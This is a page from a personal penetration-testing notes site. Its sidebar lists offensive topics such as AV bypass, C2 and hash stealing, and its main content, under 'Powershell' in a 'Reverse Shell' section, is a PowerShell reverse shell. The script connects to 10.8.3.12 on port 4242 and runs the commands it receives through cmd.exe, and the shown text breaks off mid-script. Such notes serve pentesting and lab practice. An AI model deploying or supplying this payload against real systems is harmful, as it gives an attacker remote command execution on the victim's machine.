  </li>

  <li>
      <a href="/notes/lab/vulnlab/heron/">Heron</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/lock/">Lock</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/media/">Media</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/reflection/">Reflection</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/retro/">Retro</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/sync/">Sync</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/tea/">Tea</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
  </li>
      </ul>
    </details>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Pwn-Reverse</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
  </li>

  <li>
    <details>
      <summary>CTf</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
  </li>

  <li>
      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
  </li>

  <li>
      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
  </li>
      </ul>
    </details>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Dev</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/code/asm/">ASM</a>
  </li>

  <li>
      <a href="/notes/code/bash/">Bash</a>
  </li>

  <li>
      <a href="/notes/code/c/">C</a>
  </li>

  <li>
      <a href="/notes/code/c-/">C&#43;&#43;</a>
  </li>

  <li>
      <a href="/notes/code/go/">Go</a>
  </li>

  <li>
      <a href="/notes/code/java/">Java</a>
  </li>

  <li>
      <a href="/notes/code/lua/">Lua</a>
  </li>

  <li>
      <a href="/notes/code/nodejs/">Nodejs</a>
  </li>

  <li>
      <a href="/notes/code/php/">Php</a>
  </li>

  <li>
      <a href="/notes/code/ruby/">Ruby</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Ressources</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
  </li>

  <li>
      <a href="/notes/ressources/command-linux/">Command Linux</a>
  </li>

  <li>
      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
  </li>

  <li>
      <a href="/notes/ressources/kvm/">Kvm</a>
  </li>

  <li>
      <a href="/notes/ressources/link/">Link</a>
  </li>

  <li>
      <a href="/notes/ressources/tmux/">Tmux</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Crypto</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/crypto/maths/">Maths</a>
  </li>

  <li>
      <a href="/notes/crypto/scripting/">Scripting</a>
  </li>
      </ul>
    </details>
  </li>
  </ul>
</nav>

  

          </nav>
        </aside>
      </div>
    </div>
    
    <button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavMain" aria-controls="offcanvasNavMain" aria-label="Open main navigation menu">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <line x1="4" y1="8" x2="20" y2="8"></line>
        <line x1="4" y1="16" x2="20" y2="16"></line>
      </svg>
    </button>

    
    <div class="offcanvas offcanvas-end h-auto" tabindex="-1" id="offcanvasNavMain" aria-labelledby="offcanvasNavMainLabel">
      <div class="offcanvas-header">
        <h5 class="offcanvas-title" id="offcanvasNavMainLabel">P4V1C</h5>
        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
            <path d="M18 6l-12 12"></path>
            <path d="M6 6l12 12"></path>
         </svg>
        </button>
      </div>
      
      <div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between">
        <ul class="navbar-nav flex-grow-1"><li class="nav-item">
                <a class="nav-link active" href="http://localhost:1313/notes/ad/ad-cs" aria-current="true">Notes</a>
              </li>
            <li class="nav-item">
                <a class="nav-link" href="http://localhost:1313/blog/">Blog</a>
              </li>
            </ul>

        
        
        <button type="button" id="searchToggleDesktop" class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
            <circle cx="10" cy="10" r="7"></circle>
            <line x1="21" y1="21" x2="15" y2="15"></line>
          </svg>
        </button>
        
        
        
        <button id="buttonColorMode" class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type="button" aria-label="Toggle theme">
          <svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
            <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
          </svg>
          <svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
            <path d="M12 12m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0m-5 0h1m8 -9v1m8 8h1m-9 8v1m-6.4 -15.4l.7 .7m12.1 -.7l-.7 .7m0 11.4l.7 .7m-12.1 -.7l-.7 .7"></path>
          </svg>
        </button>
        
        <ul id="socialMenu" class="nav mx-auto flex-row order-lg-4">
          <li class="nav-item">
              <a class="nav-link social-link" href="https://github.com/thuliteio/doks"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path></svg><small class="ms-2 visually-hidden">GitHub</small></a>
            </li>
          </ul>
        
        </div>
    </div>

    
    </div>
</header>
</div>

<div class="modal" id="searchModal" tabindex="-1" aria-labelledby="searchModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down">
    <div class="modal-content">
      <div class="modal-header">
        <h1 class="modal-title fs-5 visually-hidden" id="searchModalLabel">Search</h1>
        <button type="button" class="btn-close visually-hidden" data-bs-dismiss="modal" aria-label="Close"></button>
        <div class="search-input flex-grow-1 d-none">
          <form id="search-form" class="search-form" action="#" method="post" accept-charset="UTF-8" role="search">
            <label for="query" class="visually-hidden">Search</label>
            <div class="d-flex">
              <input type="search" id="query" name="query" class="search-text form-control form-control-lg" placeholder="Search" aria-label="Search" maxlength="128" autocomplete="off">
              <button type="button" class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss="modal" aria-label="Close">Cancel</button>
            </div>
          </form>
        </div>
      </div>
      <div class="modal-body">
        <p class="search-loading status message d-none mt-3 text-center">Loading search indexâ€¦</p>
        <p class="search-no-recent message d-none mt-3 text-center">No recent searches</p>
        <p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class="query-no-results">Query here</span></strong>"</p>
        <div id="searchResults" class="search-results"></div>
        <template>
          <article class="search-result list-view">
            <div class="card my-3">
              <div class="card-body">
                <header>
                  <h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href="#">Title here</a></h2>
                  <div class="submitted d-none"><time class="created-date">Date here</time></div>
                </header>
                <div class="content">Summary here</div>
              </div>
            </div>
          </article>
        </template>
      </div>
      <div class="modal-footer">
        <ul class="list-inline me-auto d-none d-md-block">
          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd><span class="DocSearch-Label">to select</span></li>
          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd><span class="DocSearch-Label">to navigate</span></li>
          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd><span class="DocSearch-Label">to close</span></li>
        </ul>
        <p class="d-md-none">Search by <a class="text-decoration-none" href="https://github.com/nextapps-de/flexsearch">FlexSearch</a></p>
      </div>
    </div>
  </div>
</div>


    <div class="wrap container-lg" role="document">
      <div class="content">
      
        
	<div class="row flex-xl-nowrap">
		<div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block">
			
  
    
<nav class="section-nav docs-links">
  <ul class="list-unstyled">

  <li>
    <details>
      <summary>AD</summary>
      <ul class="list-unstyled list-nested">

  <li>
    <details>
      <summary>Local Privilege escalation</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
  </li>

  <li>
      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Tools</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
  </li>

  <li>
      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
  </li>

  <li>
      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
  </li>

  <li>
      <a href="/notes/ad/tools/impacket/">Impacket</a>
  </li>

  <li>
      <a href="/notes/ad/tools/netexec/">Netexec</a>
  </li>

  <li>
      <a href="/notes/ad/tools/powerview/">Powerview</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
      <a href="/notes/ad/ad-cs/">AD CS</a>
  </li>

  <li>
      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
  </li>

  <li>
      <a href="/notes/ad/c2/">C2</a>
  </li>

  <li>
      <a href="/notes/ad/delegation/">Delegation</a>
  </li>

  <li>
      <a href="/notes/ad/discovery/">Discovery</a>
  </li>

  <li>
      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
  </li>

  <li>
      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
  </li>

  <li>
      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
  </li>

  <li>
      <a href="/notes/ad/linux/">Linux</a>
  </li>

  <li>
      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
  </li>

  <li>
      <a href="/notes/ad/password-looting/">Password looting</a>
  </li>

  <li>
      <a href="/notes/ad/phishing/">Phishing</a>
  </li>

  <li>
      <a href="/notes/ad/pivot/">Pivot</a>
  </li>

  <li>
      <a href="/notes/ad/tickets/">Tickets</a>
  </li>

  <li>
      <a href="/notes/ad/transfert/">Transfert</a>
  </li>

  <li>
      <a href="/notes/ad/trust-attack/">Trust Attack</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details open>
      <summary>Reverse Shell</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/shell-and-payload/bash/">Bash</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
  </li>

  <li class="active" >
      <a aria-current="page" href="/notes/shell-and-payload/powershell/">Powershell</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/python/">Python</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Webs</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/web/command-injection/">Command Injection</a>
  </li>

  <li>
      <a href="/notes/web/cors/">Cors</a>
  </li>

  <li>
      <a href="/notes/web/csrf/">CSRF</a>
  </li>

  <li>
      <a href="/notes/web/deserialization/">Deserialization</a>
  </li>

  <li>
      <a href="/notes/web/file-upload/">File Upload</a>
  </li>

  <li>
      <a href="/notes/web/git/">Git</a>
  </li>

  <li>
      <a href="/notes/web/graphsql/">Graphsql</a>
  </li>

  <li>
      <a href="/notes/web/jwt/">JWT</a>
  </li>

  <li>
      <a href="/notes/web/path-traversal/">Path Traversal</a>
  </li>

  <li>
      <a href="/notes/web/ssrf/">SSRF</a>
  </li>

  <li>
      <a href="/notes/web/web-cache/">Web Cache</a>
  </li>

  <li>
      <a href="/notes/web/wordpress/">Wordpress</a>
  </li>

  <li>
      <a href="/notes/web/xss/">XSS</a>
  </li>

  <li>
      <a href="/notes/web/xxe/">XXE</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Services</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/services/ftp/">FTP</a>
  </li>

  <li>
      <a href="/notes/services/iis/">IIS</a>
  </li>

  <li>
      <a href="/notes/services/ldap/">Ldap</a>
  </li>

  <li>
      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
  </li>

  <li>
      <a href="/notes/services/rpcbind/">RPCbind</a>
  </li>

  <li>
      <a href="/notes/services/rsync/">Rsync</a>
  </li>

  <li>
      <a href="/notes/services/rtsp/">RTSP</a>
  </li>

  <li>
      <a href="/notes/services/smtp/">SMTP</a>
  </li>

  <li>
      <a href="/notes/services/snmp/">SNMP</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Labs</summary>
      <ul class="list-unstyled list-nested">

  <li>
    <details>
      <summary>HTB</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/lab/htb/analysis/">Analysis</a>
  </li>

  <li>
      <a href="/notes/lab/htb/caption/">Caption</a>
  </li>

  <li>
      <a href="/notes/lab/htb/certified/">Certified</a>
  </li>

  <li>
      <a href="/notes/lab/htb/cicada/">Cicada</a>
  </li>

  <li>
      <a href="/notes/lab/htb/hospital/">Hospital</a>
  </li>

  <li>
      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
  </li>

  <li>
      <a href="/notes/lab/htb/perfection/">Perfection</a>
  </li>

  <li>
      <a href="/notes/lab/htb/pov/">POV</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Vulnlab</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/lab/vulnlab/baby/">Baby</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/breach/">Breach</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/build/">Build</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/data/">Data</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/escape/">Escape</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/heron/">Heron</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/lock/">Lock</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/media/">Media</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/reflection/">Reflection</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/retro/">Retro</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/sync/">Sync</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/tea/">Tea</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
  </li>
      </ul>
    </details>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Pwn-Reverse</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
  </li>

  <li>
    <details>
      <summary>CTf</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
  </li>

  <li>
      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
  </li>

  <li>
      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
  </li>
      </ul>
    </details>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Dev</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/code/asm/">ASM</a>
  </li>

  <li>
      <a href="/notes/code/bash/">Bash</a>
  </li>

  <li>
      <a href="/notes/code/c/">C</a>
  </li>

  <li>
      <a href="/notes/code/c-/">C&#43;&#43;</a>
  </li>

  <li>
      <a href="/notes/code/go/">Go</a>
  </li>

  <li>
      <a href="/notes/code/java/">Java</a>
  </li>

  <li>
      <a href="/notes/code/lua/">Lua</a>
  </li>

  <li>
      <a href="/notes/code/nodejs/">Nodejs</a>
  </li>

  <li>
      <a href="/notes/code/php/">Php</a>
  </li>

  <li>
      <a href="/notes/code/ruby/">Ruby</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Ressources</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
  </li>

  <li>
      <a href="/notes/ressources/command-linux/">Command Linux</a>
  </li>

  <li>
      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
  </li>

  <li>
      <a href="/notes/ressources/kvm/">Kvm</a>
  </li>

  <li>
      <a href="/notes/ressources/link/">Link</a>
  </li>

  <li>
      <a href="/notes/ressources/tmux/">Tmux</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Crypto</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/crypto/maths/">Maths</a>
  </li>

  <li>
      <a href="/notes/crypto/scripting/">Scripting</a>
  </li>
      </ul>
    </details>
  </li>
  </ul>
</nav>

  

		</div>
		
		<nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
			<div class="page-links">
  
</div>

		</nav>
		<main class="docs-content col-lg-11 col-xl-9">
		
			<h1>Powershell</h1>
			
			<nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation">
				
			</nav>
			


<div class="expressive-code">
  <figure class="frame is-terminal not-content">
  <figcaption class="header">
    <span class="title"></span>
  </figcaption>
  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$socket</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TcpClient</span><span class="p">(</span><span class="s1">&#39;10.8.3.12&#39;</span><span class="p">,</span> <span class="mf">4242</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$socket</span> <span class="o">-eq</span> <span class="vm">$null</span><span class="p">){</span><span class="n">exit</span> <span class="mf">1</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$socket</span><span class="p">.</span><span class="py">GetStream</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$writer</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">StreamWriter</span><span class="p">(</span><span class="nv">$stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$buffer</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Byte</span><span class="p">[]</span> <span class="mf">1024</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$encoding</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="py">Text</span><span class="p">.</span><span class="n">AsciiEncoding</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">do</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$writer</span><span class="p">.</span><span class="py">Flush</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$read</span> <span class="p">=</span> <span class="vm">$null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$res</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span><span class="nv">$stream</span><span class="p">.</span><span class="py">DataAvailable</span> <span class="o">-or</span> <span class="nv">$read</span> <span class="o">-eq</span> <span class="vm">$null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$read</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="py">Read</span><span class="p">(</span><span class="nv">$buffer</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="mf">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$out</span> <span class="p">=</span> <span class="nv">$encoding</span><span class="p">.</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$buffer</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$read</span><span class="p">).</span><span class="py">Replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">`r`n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">).</span><span class="py">Replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(!</span><span class="nv">$out</span><span class="p">.</span><span class="py">equals</span><span class="p">(</span><span class="s2">&#34;exit&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$args</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$out</span><span class="p">.</span><span class="py">IndexOf</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span> <span class="o">-gt</span> <span class="mf">-1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$args</span> <span class="p">=</span> <span class="nv">$out</span><span class="p">.</span><span class="py">substring</span><span class="p">(</span><span class="nv">$out</span><span class="p">.</span><span class="py">IndexOf</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span><span class="mf">+1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$out</span> <span class="p">=</span> <span class="nv">$out</span><span class="p">.</span><span class="py">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="nv">$out</span><span class="p">.</span><span class="py">IndexOf</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nv">$args</span><span class="p">.</span><span class="py">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">).</span><span class="py">length</span> <span class="o">-gt</span> <span class="mf">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$pinfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Diagnostics</span><span class="p">.</span><span class="py">ProcessStartInfo</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$pinfo</span><span class="p">.</span><span class="py">FileName</span> <span class="p">=</span> <span class="s2">&#34;cmd.exe&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$pinfo</span><span class="p">.</span><span class="py">RedirectStandardError</span> <span class="p">=</span> <span class="vm">$true</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$pinfo</span><span class="p">.</span><span class="py">RedirectStandardOutput</span> <span class="p">=</span> <span class="vm">$true</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$pinfo</span><span class="p">.</span><span class="py">UseShellExecute</span> <span class="p">=</span> <span class="vm">$false</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$pinfo</span><span class="p">.</span><span class="py">Arguments</span> <span class="p">=</span> <span class="s2">&#34;/c </span><span class="nv">$out</span><span class="s2"> </span><span class="nv">$args</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$p</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Diagnostics</span><span class="p">.</span><span class="k">Process</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$p</span><span class="p">.</span><span class="py">StartInfo</span> <span class="p">=</span> <span class="nv">$pinfo</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$p</span><span class="p">.</span><span class="py">Start</span><span class="p">()</span> <span class="p">|</span> <span class="nb">Out-Null</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$p</span><span class="p">.</span><span class="py">WaitForExit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$stdout</span> <span class="p">=</span> <span class="nv">$p</span><span class="p">.</span><span class="py">StandardOutput</span><span class="p">.</span><span class="py">ReadToEnd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$stderr</span> <span class="p">=</span> <span class="nv">$p</span><span class="p">.</span><span class="py">StandardError</span><span class="p">.</span><span class="py">ReadToEnd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$p</span><span class="p">.</span><span class="py">ExitCode</span> <span class="o">-ne</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$res</span> <span class="p">=</span> <span class="nv">$stderr</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$res</span> <span class="p">=</span> <span class="nv">$stdout</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="k">else</span><span class="p">{</span>
